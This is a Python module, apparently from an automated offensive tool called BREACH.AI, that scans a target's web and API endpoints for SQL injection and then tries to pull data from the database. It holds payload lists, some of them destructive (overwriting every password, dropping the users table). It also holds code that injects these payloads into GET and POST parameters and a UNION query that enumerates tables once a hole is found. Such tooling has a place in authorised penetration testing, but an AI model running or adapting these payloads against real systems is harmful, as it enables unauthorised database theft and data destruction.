"""
BREACH.AI v2 - SQLi Destroyer Module

SQL injection to database access - from vulnerability to data.
"""

import asyncio
import re
import json
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from backend.breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from backend.breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# SQLi payloads by type
SQLI_PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'#",
        "1' AND '1'='1",
        "1 AND 1=1",
        "' UNION SELECT NULL--",
        "'; SELECT * FROM users--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
    ],
    "union_based": [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password,3 FROM users--",
        "' UNION SELECT table_name,column_name,3 FROM information_schema.columns--",
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
    ],
    "stacked": [
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; UPDATE users SET password='hacked'--",
        "'; DROP TABLE users--",  # Never actually execute this
    ],
}

# Error patterns indicating SQL injection
SQL_ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"pg_query",
    r"sqlite3?_",
    r"ORA-\d+",
    r"Microsoft SQL",
    r"ODBC Driver",
    r"SQLException",
    r"syntax error",
    r"unclosed quotation",
    r"unterminated string",
    r"invalid column",
    r"column.*does not exist",
]


@register_module
class SQLiDestroyer(InitialAccessModule):
    """
    SQLi Destroyer - From SQL injection to database access.

    Techniques:
    - Error-based SQLi
    - Union-based SQLi
    - Blind boolean SQLi
    - Time-based blind SQLi
    - Stacked queries
    - Second-order injection

    Chains to:
    - DATA_ACCESS (direct database access)
    - FOOTHOLD (if OS command execution possible)
    """

    info = ModuleInfo(
        name="sqli_destroyer",
        phase=BreachPhase.INITIAL_ACCESS,
        description="SQL injection to database access",
        author="BREACH.AI",
        techniques=["T1190", "T1059.004"],  # Exploit Public-Facing App, SQL
        platforms=["web", "api"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.DATABASE,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we have endpoints to test."""
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        self._start_execution()

        vulnerabilities = []
        data_extracted = []

        # Get endpoints from chain data or discover them
        endpoints = config.chain_data.get("api_endpoints", [])
        if not endpoints:
            endpoints = await self._discover_endpoints(config.target)

        # Test each endpoint
        for endpoint in endpoints[:20]:  # Limit to 20 endpoints
            url = urljoin(config.target, endpoint)

            # Test GET parameters
            get_vulns = await self._test_get_params(url, config)
            vulnerabilities.extend(get_vulns)

            # Test POST parameters
            post_vulns = await self._test_post_params(url, config)
            vulnerabilities.extend(post_vulns)

            # If we found SQLi, try to extract data
            if vulnerabilities:
                data = await self._extract_data(vulnerabilities[0], config)
                if data:
                    data_extracted.append(data)

        # Determine access level
        access_gained = None
        if data_extracted:
            access_gained = AccessLevel.DATABASE

        # Add evidence
        for vuln in vulnerabilities:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"SQL Injection in {vuln['endpoint']}",
                content={
                    "endpoint": vuln["endpoint"],
                    "parameter": vuln["parameter"],
                    "payload": vuln["payload"],
                    "type": vuln["type"],
                    "response_snippet": vuln.get("response", "")[:500],
                },
                proves="Database queries can be manipulated",
                severity=Severity.CRITICAL,
            )

        if data_extracted:
            for data in data_extracted:
                self._add_data_sample_evidence(
                    description="Data extracted via SQL injection",
                    data=data,
                    proves="Full database access achieved",
                    severity=Severity.CRITICAL,
                    redact_pii=True,
                )

        return self._create_result(
            success=len(vulnerabilities) > 0,
            action="sql_injection",
            details=f"Found {len(vulnerabilities)} SQLi vulnerabilities",
            access_gained=access_gained,
            data_extracted={
                "vulnerabilities": vulnerabilities,
                "data_samples": data_extracted,
            },
            enables_modules=["database_pillager"] if access_gained else [],
        )

    async def _discover_endpoints(self, target: str) -> list[str]:
        """Discover endpoints that might have parameters."""
        endpoints = [
            "/api/users", "/api/search", "/api/products", "/api/items",
            "/api/login", "/api/auth", "/api/query", "/api/data",
            "/search", "/query", "/filter", "/lookup",
        ]
        return endpoints

    async def _test_get_params(self, url: str, config: ModuleConfig) -> list[dict]:
        """Test GET parameters for SQLi."""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # If no existing params, add test param
        if not params:
            params = {"id": ["1"], "q": ["test"]}

        for param_name in params:
            for sqli_type, payloads in SQLI_PAYLOADS.items():
                for payload in payloads[:3]:  # Test first 3 payloads per type
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    try:
                        response = await self._safe_request(
                            "GET", test_url,
                            cookies=config.cookies,
                            headers=config.headers,
                            timeout=15,
                        )

                        if response and self._detect_sqli(response, sqli_type, payload):
                            vulns.append({
                                "endpoint": url,
                                "parameter": param_name,
                                "method": "GET",
                                "payload": payload,
                                "type": sqli_type,
                                "response": response.get("text", "")[:500],
                            })
                            break  # Found vuln, move to next param

                    except Exception:
                        continue

        return vulns

    async def _test_post_params(self, url: str, config: ModuleConfig) -> list[dict]:
        """Test POST parameters for SQLi."""
        vulns = []

        # Common POST body structures
        test_bodies = [
            {"id": "1", "name": "test"},
            {"username": "test", "password": "test"},
            {"query": "test", "filter": "test"},
        ]

        for body in test_bodies:
            for param_name in body:
                for sqli_type, payloads in SQLI_PAYLOADS.items():
                    for payload in payloads[:2]:
                        test_body = body.copy()
                        test_body[param_name] = payload

                        try:
                            response = await self._safe_request(
                                "POST", url,
                                json=test_body,
                                cookies=config.cookies,
                                headers=config.headers,
                                timeout=15,
                            )

                            if response and self._detect_sqli(response, sqli_type, payload):
                                vulns.append({
                                    "endpoint": url,
                                    "parameter": param_name,
                                    "method": "POST",
                                    "payload": payload,
                                    "type": sqli_type,
                                    "response": response.get("text", "")[:500],
                                })
                                break

                        except Exception:
                            continue

        return vulns

    def _detect_sqli(self, response: dict, sqli_type: str, payload: str) -> bool:
        """Detect if SQLi was successful."""
        text = response.get("text", "")
        status = response.get("status_code", 0)

        # Check for SQL errors (error-based)
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True

        # Check for union-based success (data in response)
        if sqli_type == "union_based":
            # Look for table/column names that shouldn't be visible
            if any(kw in text.lower() for kw in ["information_schema", "table_name", "column_name"]):
                return True

        # For time-based, check if response took longer
        # (Would need to measure response time - simplified here)

        return False

    async def _extract_data(self, vuln: dict, config: ModuleConfig) -> dict:
        """Try to extract data using the SQLi vulnerability."""
        if vuln["type"] not in ["error_based", "union_based"]:
            return {}

        # Try to enumerate tables first
        extraction_payload = "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--"

        try:
            if vuln["method"] == "GET":
                url = vuln["endpoint"]
                parsed = urlparse(url)
                params = {vuln["parameter"]: extraction_payload}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params)}"
                response = await self._safe_request("GET", test_url, timeout=15)
            else:
                response = await self._safe_request(
                    "POST", vuln["endpoint"],
                    json={vuln["parameter"]: extraction_payload},
                    timeout=15,
                )

            if response:
                # Parse response for table names
                text = response.get("text", "")
                # Simplified - in reality would parse structured data
                return {
                    "source": "sqli_extraction",
                    "endpoint": vuln["endpoint"],
                    "sample_data": text[:1000],
                }

        except Exception:
            pass

        return {}
